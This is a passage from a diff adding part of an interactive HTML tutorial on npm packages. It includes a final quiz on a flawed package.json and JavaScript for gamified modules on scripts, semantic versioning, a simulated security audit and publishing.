+                    <div class="code-line">  <span class="json-key">"name"</span>: <span class="json-string">"Awesome-App"</span>,</div>
+                    <div class="code-line">  <span class="json-key">"version"</span>: <span class="json-string">"1.0.0"</span>,</div>
+                    <div class="code-line">  <span class="json-key">"scripts"</span>: {</div>
+                    <div class="code-line">    <span class="json-key">"test"</span>: <span class="json-string">"jest"</span>,</div>
+                    <div class="code-line">    <span class="json-key">"build"</span>: <span class="json-string">"webpack"</span>,</div>
+                    <div class="code-line">    <span class="json-key">"prepublish"</span>: <span class="json-string">"npm test && npm build"</span></div>
+                    <div class="code-line">  },</div>
+                    <div class="code-line">  <span class="json-key">"dependencies"</span>: {</div>
+                    <div class="code-line">    <span class="json-key">"react"</span>: <span class="json-string">"^16.0.0"</span>,</div>
+                    <div class="code-line">    <span class="json-key">"lodash"</span>: <span class="json-string">"4.17.4"</span></div>
+                    <div class="code-line">  },</div>
+                    <div class="code-line">  <span class="json-key">"devDependencies"</span>: {</div>
+                    <div class="code-line">    <span class="json-key">"jest"</span>: <span class="json-string">"latest"</span></div>
+                    <div class="code-line">  }</div>
+                    <div class="code-line">}</div>
+                </div>
+
+                <div style="margin-top: 1.5rem;">
+                    <h4>Identify the issues (select all that apply):</h4>
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-top: 1rem;">
+                        <label class="option" onclick="toggleMultiSelect(this)" data-value="1">
+                            <span class="option-label">1</span>
+                            <span>Package name contains uppercase</span>
+                        </label>
+                        <label class="option" onclick="toggleMultiSelect(this)" data-value="2">
+                            <span class="option-label">2</span>
+                            <span>Prepublish script uses wrong syntax for build</span>
+                        </label>
+                        <label class="option" onclick="toggleMultiSelect(this)" data-value="3">
+                            <span class="option-label">3</span>
+                            <span>Lodash version has known vulnerabilities</span>
+                        </label>
+                        <label class="option" onclick="toggleMultiSelect(this)" data-value="4">
+                            <span class="option-label">4</span>
+                            <span>Jest version uses "latest" tag</span>
+                        </label>
+                        <label class="option" onclick="toggleMultiSelect(this)" data-value="5">
+                            <span class="option-label">5</span>
+                            <span>Missing "start" script</span>
+                        </label>
+                    </div>
+                </div>
+                <button class="btn" onclick="checkFinalChallenge()" style="margin-top: 1.5rem;">Submit Solution</button>
+                <div id="finalFeedback" class="feedback"></div>
+            </div>
+
+            <div class="badge-container" id="badgeContainer" style="margin-top: 2rem;">
+                <div class="badge" id="badge1">📦 Package Master</div>
+                <div class="badge" id="badge2">⚡ Script Ninja</div>
+                <div class="badge" id="badge3">🔢 Version Guru</div>
+                <div class="badge" id="badge4">🔒 Security Guard</div>
+                <div class="badge" id="badge5">🚀 Publisher</div>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        // State Management
+        let xp = 0;
+        let completedModules = new Set();
+        let currentDragElement = null;
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            generateSemverGame();
+            updateJson();
+        });
+
+        // Navigation
+        function openModule(moduleId) {
+            document.getElementById('moduleGrid').style.display = 'none';
+            document.querySelectorAll('.interactive-container').forEach(el => {
+                el.classList.remove('active');
+            });
+            document.getElementById(moduleId).classList.add('active');
+            window.scrollTo(0, 0);
+        }
+
+        function showGrid() {
+            document.getElementById('moduleGrid').style.display = 'grid';
+            document.querySelectorAll('.interactive-container').forEach(el => {
+                el.classList.remove('active');
+            });
+        }
+
+        function addXP(amount) {
+            xp += amount;
+            document.getElementById('xpCounter').textContent = `XP: ${xp}`;
+            updateProgress();
+        }
+
+        function updateProgress() {
+            const percent = (completedModules.size / 6) * 100;
+            document.getElementById('progressFill').style.width = percent + '%';
+        }
+
+        function completeModule(moduleId) {
+            if (!completedModules.has(moduleId)) {
+                completedModules.add(moduleId);
+                document.querySelector(`[onclick="openModule('${moduleId}')"]`)?.classList.add('completed');
+                addXP(100);
+                
+                if (completedModules.size === 6) {
+                    launchConfetti();
+                }
+            }
+        }
+
+        // Module 1: Package.json
+        function updateJson() {
+            const name = document.getElementById('pkgName').value || 'your-package';
+            const version = document.getElementById('pkgVersion').value || '1.0.0';
+            const desc = document.getElementById('pkgDesc').value || '';
+            const main = document.getElementById('pkgMain').value || 'index.js';
+            const license = document.getElementById('pkgLicense').value;
+
+            const json = {
+                name: name.toLowerCase().replace(/\s+/g, '-'),
+                version: version,
+                description: desc,
+                main: main,
+                license: license,
+                scripts: {
+                    test: "echo \"Error: no test specified\" && exit 1"
+                },
+                keywords: [],
+                author: "",
+                dependencies: {},
+                devDependencies: {}
+            };
+
+            const html = syntaxHighlight(JSON.stringify(json, null, 2));
+            document.getElementById('jsonPreview').innerHTML = html;
+        }
+
+        function syntaxHighlight(json) {
+            return json.replace(/("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?)/g, function (match) {
+                let cls = 'json-number';
+                if (/^"/.test(match)) {
+                    if (/:$/.test(match)) {
+                        cls = 'json-key';
+                    } else {
+                        cls = 'json-string';
+                    }
+                } else if (/true|false/.test(match)) {
+                    cls = 'json-boolean';
+                }
+                return '<span class="' + cls + '">' + match + '</span>';
+            });
+        }
+
+        function validatePackageJson() {
+            const name = document.getElementById('pkgName').value;
+            const version = document.getElementById('pkgVersion').value;
+            
+            const errors = [];
+            if (!name) errors.push("Name is required");
+            if (name && /[A-Z]/.test(name)) errors.push("Name should be lowercase");
+            if (name && /\s/.test(name)) errors.push("Name cannot contain spaces");
+            if (!version) errors.push("Version is required");
+            if (version && !/^\d+\.\d+\.\d+/.test(version)) errors.push("Version should follow semver (x.x.x)");
+
+            if (errors.length === 0) {
+                showFeedback('jsonFeedback', 'Perfect! Valid package.json structure.', true);
+                addXP(50);
+                completeModule('packagejson');
+            } else {
+                showFeedback('jsonFeedback', 'Issues found: ' + errors.join(', '), false);
+            }
+        }
+
+        function checkJsonFixes() {
+            const fix1 = document.getElementById('fix1').textContent.trim();
+            const fix2 = document.getElementById('fix2').textContent.trim();
+            const fix3 = document.getElementById('fix3').textContent.trim();
+
+            const correct1 = fix1 === 'my-awesome-app' || fix1 === '"my-awesome-app"';
+            const correct2 = fix2 === '1.0.0' || fix2 === '"1.0.0"';
+            const correct3 = fix3.includes('^') || fix3.includes('~') || /^\d/.test(fix3);
+
+            if (correct1 && correct2 && correct3) {
+                showFeedback('jsonFeedback', 'Excellent! All issues fixed: lowercase name, no "v" prefix, and specific version.', true);
+                addXP(75);
+            } else {
+                const issues = [];
+                if (!correct1) issues.push("Package name should be lowercase with hyphens");
+                if (!correct2) issues.push("Version shouldn't have 'v' prefix");
+                if (!correct3) issues.push("Avoid 'latest', use specific versions or ranges");
+                showFeedback('jsonFeedback', 'Keep trying: ' + issues.join(', '), false);
+            }
+        }
+
+        // Module 2: Scripts
+        function handleTerminal(e) {
+            if (e.key === 'Enter') {
+                const input = e.target.value;
+                const terminal = document.getElementById('terminalBody');
+                
+                terminal.innerHTML += `\n$ ${input}`;
+                
+                if (input === 'help') {
+                    terminal.innerHTML += `\nAvailable commands:\n  npm run build\n  npm test\n  npm start\n  npm run deploy\n  clear`;
+                } else if (input === 'npm run build') {
+                    terminal.innerHTML += `\n> webpack --mode production\n✓ Build completed in 2.3s\n✓ Bundle size: 145kb`;
+                    addXP(10);
+                } else if (input === 'npm test') {
+                    terminal.innerHTML += `\n> jest\n✓ 42 tests passed\n✓ 100% coverage`;
+                    addXP(10);
+                } else if (input === 'clear') {
+                    terminal.innerHTML = '';
+                } else {
+                    terminal.innerHTML += `\nCommand executed: ${input}`;
+                }
+                
+                terminal.scrollTop = terminal.scrollHeight;
+                e.target.value = '';
+            }
+        }
+
+        function drag(ev) {
+            currentDragElement = ev.target;
+            ev.dataTransfer.setData("text", ev.target.getAttribute('data-cmd'));
+        }
+
+        function allowDrop(ev) {
+            ev.preventDefault();
+        }
+
+        function drop(ev) {
+            ev.preventDefault();
+            const data = ev.dataTransfer.getData("text");
+            const dropZone = document.getElementById('scriptDrop');
+            
+            if (dropZone.querySelector('p')) {
+                dropZone.innerHTML = '';
+            }
+            
+            const div = document.createElement('div');
+            div.className = 'option';
+            div.style.marginBottom = '0.5rem';
+            div.textContent = data === 'test' ? 'npm test' : 
+                             data === 'build' ? 'npm run build' :
+                             data === 'lint' ? 'eslint src/' : 'gh-pages -d dist';
+            div.setAttribute('data-cmd', data);
+            dropZone.appendChild(div);
+        }
+
+        function checkScriptOrder() {
+            const commands = document.querySelectorAll('#scriptDrop .option');
+            const order = Array.from(commands).map(el => el.getAttribute('data-cmd'));
+            const correct = ['lint', 'test', 'build', 'deploy'];
+            
+            if (JSON.stringify(order) === JSON.stringify(correct)) {
+                showFeedback('jsonFeedback', 'Perfect pipeline! Lint → Test → Build → Deploy is the correct order.', true);
+                addXP(50);
+                completeModule('scripts');
+            } else {
+                showFeedback('jsonFeedback', 'Not quite. Remember: Check code quality first, then test, then build, then deploy.', false);
+            }
+        }
+
+        function selectOption(el, isCorrect) {
+            const parent = el.parentElement;
+            parent.querySelectorAll('.option').forEach(opt => {
+                opt.classList.remove('correct', 'wrong');
+                opt.style.pointerEvents = 'none';
+            });
+            
+            if (isCorrect) {
+                el.classList.add('correct');
+                addXP(25);
+            } else {
+                el.classList.add('wrong');
+                parent.querySelectorAll('.option').forEach(opt => {
+                    if (opt.onclick.toString().includes('true')) {
+                        opt.classList.add('correct');
+                    }
+                });
+            }
+        }
+
+        // Module 3: Semver
+        function generateSemverGame() {
+            const scenarios = [
+                { text: "Fixed a typo in documentation", type: "patch", icon: "📝" },
+                { text: "Added new API endpoint", type: "minor", icon: "✨" },
+                { text: "Removed deprecated function", type: "major", icon: "💥" },
+                { text: "Fixed memory leak bug", type: "patch", icon: "🐛" },
+                { text: "Dropped Node 12 support", type: "major", icon: "⚠️" },
+                { text: "Added TypeScript definitions", type: "minor", icon: "📘" }
+            ];
+
+            const container = document.getElementById('semverGame');
+            scenarios.forEach((scenario, idx) => {
+                const card = document.createElement('div');
+                card.className = 'semver-card';
+                card.innerHTML = `
+                    <div style="font-size: 2rem; margin-bottom: 0.5rem;">${scenario.icon}</div>
+                    <div style="font-size: 0.9rem; margin-bottom: 1rem;">${scenario.text}</div>
+                    <select class="version-select" style="padding: 0.5rem; border-radius: 4px; border: none; background: rgba(0,0,0,0.3); color: white; cursor: pointer;">
+                        <option value="">Select version...</option>
+                        <option value="major">MAJOR (x.0.0)</option>
+                        <option value="minor">MINOR (0.x.0)</option>
+                        <option value="patch">PATCH (0.0.x)</option>
+                    </select>
+                `;
+                card.querySelector('select').addEventListener('change', function() {
+                    if (this.value === scenario.type) {
+                        this.style.background = 'rgba(16, 185, 129, 0.3)';
+                        addXP(10);
+                    } else {
+                        this.style.background = 'rgba(203, 56, 55, 0.3)';
+                    }
+                });
+                container.appendChild(card);
+            });
+        }
+
+        function toggleNode(el) {
+            el.classList.toggle('selected');
+        }
+
+        function checkSemverResolution() {
+            const selected = document.querySelectorAll('.node.selected');
+            const correct = document.querySelectorAll('.node[data-correct="true"]');
+            
+            const allCorrect = selected.length === correct.length && 
+                             Array.from(selected).every(el => el.getAttribute('data-correct') === 'true');
+            
+            if (allCorrect) {
+                showFeedback('semverFeedback', 'Correct! ^4.17.0 allows 4.x.x but not 5.0.0 or 3.x.x', true);
+                addXP(50);
+                completeModule('semver');
+            } else {
+                showFeedback('semverFeedback', 'Remember: ^ allows changes that do not modify the left-most non-zero digit.', false);
+            }
+        }
+
+        // Module 4: Security
+        function checkSecurity() {
+            const sec1 = document.getElementById('sec1').checked;
+            const sec2 = document.getElementById('sec2').checked;
+            const sec3 = document.getElementById('sec3').checked;
+            const sec4 = document.getElementById('sec4').checked;
+
+            const output = document.getElementById('auditOutput');
+            
+            if (sec1 && sec2 && sec3 && sec4) {
+                output.innerHTML = `
+<span style="color: var(--accent);"># npm audit report</span>
+
+<span style="color: var(--warning);">lodash  <=4.17.4</span>
+Severity: high
+Prototype Pollution - https://npmjs.com/advisories/782
+fix available via \`npm audit fix\`
+<span style="color: var(--success);">+ lodash@4.17.21</span>
+
+<span style="color: var(--accent);">left-pad</span>
+Severity: moderate
+Package unpublished from registry
+<span style="color: var(--success);">+ Use native String.prototype.padStart()</span>
+
+<span style="color: var(--accent);">malicious-pkg</span>
+Severity: critical
+Untrusted tarball source
+<span style="color: var(--success);">+ Remove immediately</span>
+
+<span style="color: var(--accent);">postinstall</span>
+Severity: high
+Remote code execution risk
+<span style="color: var(--success);">+ Review scripts before install</span>
+
+found 4 vulnerabilities (1 low, 1 moderate, 2 high) in 15 packages
+run \`npm audit fix\` to fix them, or \`npm audit\` for details`;
+                
+                showFeedback('auditOutput', 'All vulnerabilities identified! Check the terminal output.', true);
+                addXP(50);
+                completeModule('security');
+            } else {
+                output.innerHTML = 'Not all vulnerabilities found. Keep looking!';
+            }
+        }
+
+        // Module 5: Publishing
+        function toggleCheck(el) {
+            const label = el.querySelector('.option-label');
+            if (label.textContent === '☐') {
+                label.textContent = '☑';
+                el.style.background = 'rgba(16, 185, 129, 0.1)';
+            } else {
+                label.textContent = '☐';
+                el.style.background = '';
+            }
+        }
+
+        function simulatePublish() {
+            const checks = document.querySelectorAll('#publishChecklist .option-label');
+            const allChecked = Array.from(checks).every(el => el.textContent === '☑');
+            
+            if (allChecked) {
+                document.getElementById('publishFeedback').className = 'feedback success show';
+                document.getElementById('publishFeedback').innerHTML = '✓ Package published successfully! Your package is now live on NPM.';
+                addXP(50);
+                completeModule('publishing');
+                document.getElementById('badge5').classList.add('earned');
+            } else {
+                showFeedback('publishFeedback', 'Please complete all checklist items before publishing.', false);
+            }
+        }
+
+        // Final Challenge
+        let finalSelections = new Set();
+
+        function toggleMultiSelect(el) {
+            const val = el.getAttribute('data-value');
+            if (finalSelections.has(val)) {
+                finalSelections.delete(val);
+                el.classList.remove('selected');
+            } else {
+                finalSelections.add(val);
+                el.classList.add('selected');
+            }
+        }
+
+        function checkFinalChallenge() {
+            const correct = ['1', '2', '3', '4'];
+            const selected = Array.from(finalSelections).sort();
+            
+            if (JSON.stringify(selected) === JSON.stringify(correct)) {
+                showFeedback('finalFeedback', 'Outstanding! You identified all issues: uppercase name, wrong build syntax (should be npm run build), vulnerable lodash, and "latest" tag usage.', true);
+                addXP(100);
+                completeModule('final');
+                document.getElementById('badge1').classList.add('earned');
+                document.getElementById('badge2').classList.add('earned');
+                document.getElementById('badge3').classList.add('earned');
+                document.getElementById('badge4').classList.add('earned');
+                launchConfetti();
+            } else {
+                showFeedback('finalFeedback', 'Not quite. Look for 4 specific issues. Hint: Check the prepublish script syntax carefully!', false);
+            }
+        }
+
+        // Utilities
+        function showFeedback(id, message, isSuccess) {
+            const el = document.getElementById(id);
+            el.className = `feedback ${isSuccess ? 'success' : 'error'} show`;
+            el.innerHTML = isSuccess ? '✓ ' + message : '✗ ' + message;
+        }
+
+        // Confetti Effect
+        function launchConfetti() {
+            const canvas = document.getElementById('confetti-canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+
+            const particles = [];
+            const colors = ['#cb3837', '#10b981', '#3b82f6', '#f59e0b', '#8b5cf6'];
+
+            for (let i = 0; i < 100; i++) {
+                particles.push({
+                    x: Math.random() * canvas.width,
+                    y: Math.random() * canvas.height - canvas.height,
+                    color: colors[Math.floor(Math.random() * colors.length)],
+                    size: Math.random() * 5 + 2,
+                    speedY: Math.random() * 3 + 2,
+                    speedX: Math.random() * 2 - 1
+                });
+            }
+
+            function animate() {
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+                let active = false;
+
+                particles.forEach(p => {
+                    p.y += p.speedY;
+                    p.x += p.speedX;
+                    
+                    if (p.y < canvas.height) active = true;
+                    
+                    ctx.fillStyle = p.color;
+                    ctx.fillRect(p.x, p.y, p.size, p.size);
+                });
+
+                if (active) requestAnimationFrame(animate);
+            }
+
+            animate();
+        }
+
+        window.addEventListener('resize', () => {
+            const canvas = document.getElementById('confetti-canvas');
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
+    </script>
+</body>
+</html>
